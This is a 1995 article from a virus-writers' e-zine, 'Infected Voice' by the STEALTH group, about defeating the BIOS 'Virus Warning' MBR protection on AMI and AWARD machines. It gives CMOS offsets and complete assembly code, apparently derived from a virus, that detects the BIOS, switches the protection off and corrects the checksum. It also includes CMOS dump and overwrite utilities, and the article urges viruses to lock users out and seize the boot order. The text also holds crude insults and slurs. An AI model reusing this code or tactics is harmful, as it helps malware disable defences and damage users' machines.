	 ßßß Monthly Magazine Û For VirMakers.                  FEB '95
	 ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßŞßßß  ÛÛßßßÛÛ  
	  ŞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    İ Û ÜßÛ Û Üßß ÛÜÜ   ÛÛ ßßÛÛ
	   Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     ÛÛÛÛ ÛÛ
	   Û Ş Ş Ş   ŞÜÜ ŞÜÜ  Ş  ŞÜÜ ŞÜß     ßÛ ßÜÛ Ş ŞÜÜ ŞÜÜÜ  ÛÛÜÜÜÛÛ
	   Ş ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÜÜÜÜÜÜÜ 
	     Copyright , (C),1994-95, by STEALTH group, unLtd.
	     (M)ail: BOX 10, KIEV 148, The CUNTry of fUcKRAINE


		Virus Warning :  Enabled ? 
		---------------------------------------- (C) LovinGOD
		Contents:        1.   Theory.
				 2.   Virus Protection disabler (ASM)
				 3,4. CMOS Read/Write Utility   (ASM)
		---------------------------------------- ------------
	
		AT Designers decided to cut off viruses at low level-
	by closing MBR and controlling MBR write access. They thought
	this "hard" protection was invulnerable.
		
	Really, if you're writing smthng to MBR when "Virus Warning"=ON,
	you'll hear and see the BIOS' guard barking: "Yes or No?". 
	(2B)|(!2B ) ? 2B !
	Rem. about Russian users:  a lot of users in ex-USSR don't know
	English and usually answer "Yes" on all questions if even it will
	be "Destroy all data on your hard disk ?". That's a result and 
	proves my remark that viruses continue to possess the MBR without
	borders, fighting the CMOS feature by the users' foolishness.
	But if "Virus Warning" enabled and lamer/user/enemy already warned ?
	Call the carpenter... 
	This article was written in February'95, but since that time no
	viriis have been able to penetrate the "hard" wall. Except Tchechen.
	
	What's the result of the anti-virusers new tricks ? They're able to
	stop 99, maybe 100% of viriis, existing before the anti-virus was
	issued. Naturally, the next virus lives without any trouble some
	time. The Lamers/Users trust the stupid polyfags and idiotic
	heuristics like DRWeb,FProt and TBav. And so on until the Universal
	Virus/Universal AntiVirus, appears.

		Describing this feature, especially in a WorldWide issue,
	I hope that AMI & AWARD will not run and change all their BIOS'es
	so that the survival of our living techno-creatures grows. More, the
	virus, settled in MBR, can set Virus Warning On by itself to protect
	itself from other viriis.
	
	(Pieces of Norton Guide were used)
	----------------------------------------------------------------
	All AT computers have a Real Time Clock and 64 byte memory block
	with a low energy consumption CMOS. Some ATs have a 128 byte CMOS
	that contains additional information.

		 This memory contains different info (see below)

 Address Purpose
ÉÍÍÍÍÍÍÍ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º00h-0Dh real time clock                                                     º
º0Eh     power_on self test byte                                             º
º0Fh     reset state byte                                                    º
º10h     floppy disk type         ÄÄÄÄÄ¿                                     º
º11h     Reserved                      ³                                     º
º12h     hard disk type                ³                                     º
º13h     Reserved                      ÆÍ  protected by checksum             º
º14h     hardware's byte               ³                                     º
º15h-16h base memory size              ³                                     º
º17h-18h additional memory size        ³                                     º
º19h     1st hard disk type            ³                                     º
º1Ah     2nd hard disk type            ³                                     º
º1Bh-2Dh Reserved                 ÄÄÄÄÄÙ                                     º
º2Eh-2Fh CMOS checksum (10h..20h)                                            º
º30h-31h additional memory size                                              º
º32h     current century in binary-decimal format (BCD) (i.e. 19h)           º
º33h     additional info                                                     º
º34h-3Fh Reserved                                                            º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
      Adresses from 10h to 20h are protected by a checksum to detect hardware 
      or battery faults. It's simply a 16-bit sum.
      AMI BIOS has a checksum for other CMOS regions, namely for 30-3Dh,
 stored in 3Eh,3Fh (high,low). The rest isn't explored by me yet.
 
      The checksum, as you will find, ISN'T protected, so you can correct it
 to avoid "CMOS checksum failure.." at bootup.  
      Known viruses already "work" with CMOS, perverting and clearing it.
 Not a frightening disaster. I lost my CMOS many times during experiments for
 this article, and nothing bad has happened.
      If the checksum on bootup doesn't match with with the stored, all CMOS
 together with passwords etc. can be zeroed. Hard drive not found, Keyboard
 not installed (imagine real keyboard uninstallation - Press "Del", but
 where ?)
	
      Let's skip the first 33h CMOS bytes - it's a field for CMOS perverts,
 we're walking direct to the Reserved Area. What's reserved specially for
 us ?  A lot. Bootup sequence, Password, Virus Warning. The Attacking virus
 can not only fuck up the hard drive, but lock itself by Password (and user
 will learn where the CMOS battery is situated ), then change bootup sequence
 to "C: A:" and boot itself from infected drive C:...
      We'll return to passwords in another article, we'll now go to the
 Virus Warning.

      The most popular are AWARD and AMI BIOSes. What's the difference
 between them ?

    "Virus Warning" bit         A M I                   A W A R D

 1. Offset:                     34h                     3Ch
 2. Enabled:                    Bit 7=1                 Bit 7=0
 3. Checksum bytes:             3Eh,3Fh                 absent

	
      Here's some code, based on Tchechen. It takes off Virus Warning bits.
      Cut it, assemble and enjoy!    

;==========================CUT HERE ...=======================================
.model tiny
.code
org 100h
start:

ÛÛŞÛŞİİ³ VirWarning:

    GetBIOSType:                        
	mov  bp,offset BIOSnames        ; Address of BIOS' names string
	call ScanBIOSname               ; Looking for "MEGATRENDS"
	jz   AMIisIt                    
	add  bp,[bp]
	inc  bp                         ; next element of list
	call ScanBIOSname               ; Looking for AWARD
	jz   AWARDIsIt

	jmp  EndWarning                 ; another BIOS type

 ;==========================================================================
 ÜÜÜ ScanBIOSname:              ; 
				; Input: bp= address of BIOS' names sting
	push ax cx si di es ds
	mov  ax,0F000h          ; from BIOS
	mov  es,ax
	xor  di,di              ; offset 0000

	push cs                 
	pop  ds

	mov  cx,0FFFFh          ; how deep to search
     ScanBIOS:
	push di cx              ; save CX - there's enclosed cycle
	mov  si,bp              ; search string start
	inc  si                 ; 
	xor  cx,cx
	mov  cl,byte ptr ds:[bp] ; string size b4 string
				 ; Like a Pascal!
	repe cmpsb      
				
	pop  cx di
	jz   ExitLoop
	inc  di                 ; further
	loop ScanBIOS
     ExitLoop:
	pop  ds es di si cx ax
	retn                    ; End of Procedure
;=============================================================

				; AMERICAN TRENDS*1.000.000 
ŞŞŞŞ AMIIsIt:                   ; 34h:  X*******    1=ENABLED 0=Disabled
				; 3Eh,3Fh:          16 bit Checksum

	mov al,34h              ; here's required bit
	out 70h,al
	jmp $+2
	in  al,71h

	test al,80h             ;  Virus Warning Enabled?       
	jz  EndWarning          ;  No. That's fuckin great!

	sub al,80h              ;  Now Disabled.
	push ax

	mov al,34h              ; write back to CMOS
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

CheckSum:                       ; Correct 16bit checksum (3Eh,3Fh)
	mov al,3Fh              ; lower byte
	out 70h,al
	jmp $+2
	in al,71h
	sub al,80h              ; Checksum - Without Virus Warning
	pushf
	push ax

	mov al,3Fh
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

	mov al,3Eh              ; higher byte
	out 70h,al
	jmp $+2
	in  al,71h
	popf
	sbb al,0                
	push ax
	
	mov al,3Eh      
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

	jmp  EndWarning

				; If computer AWARDed...
ŞŞŞ AWARDIsIt:                  ; There's no checksums!

	mov al,03Ch             ; here's Warus Virning, i.e. vice versa
	out 70h,al      
	jmp $+2
	in  al,71h
	test al,10000000B       ; Disabled=1 Enabled=0
	jnz EndWarning
      Enabled:
      SwitchOff:
	or   al,10000000B       ; 1 means "Disabled"
				; Sometimes useful to fill CMOS with 1, not 0.
	push ax
	mov al,03ch
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

EndWarning:
int 20h                         ; That's all

BIOSNames db 10,'Megatrends'
	  db  5,'AWARD'

end start
;=========================================== ...AND THERE ==================

				ÜÜÜÜ 3 ÜÜÜÜ

;=========================================== CUT HERE... ===================
; Read 128 CMOS bytes to file CMOS.DMP
; (C) LovinGOD for the INFECTED VOICE
; No comments.
.model tiny
.code
org 100h
start:

mov ax,3C00h
mov dx,offset Fn
mov cx,0000
int 21h
jc  Error
xchg ax,bx

mov di,offset Cmos
mov cl,00

Read:
	mov al,cl
	out 70h,al
	jmp $+2
	in  al,71h
	stosb
	inc cl
	cmp cl,128
	jbe Read

WriteFile:
	
	mov ah,40h
	mov cx,128
	mov dx,offset Cmos
	int 21h

Error:
     int 20h    

Fn   db 'cmos.dmp',0
Cmos db 128 dup(?)

end start
;========================================== ... AND THERE ===================

				 ÜÜÜ 4 ÜÜÜ

;========================================== CUT HERE... =====================
; Write 128 bytes to CMOS from CMOS.DMP
; (C)LovinGOD for INFECTED VOICE
.model tiny                     
.code
org 100h
start:

mov ax,3D02h                    
mov dx,offset Fn
mov cx,0000
int 21h
jc  Error
xchg ax,bx

mov ah,3fh              
mov dx,offset Cmos
mov cx,128
int 21h
jc  Error

mov si,offset Cmos              
mov cl,00

Read:
	mov al,cl
	out 70h,al
	jmp $+2
	lodsb
	out 71h,al
	inc cl
	cmp cl,128
	jbe Read
Error:
	int 20h 

Fn   db 'cmos.dmp',0
Cmos db 128 dup(?)

end start
;===================================== CUT THERE AT LAST =====================
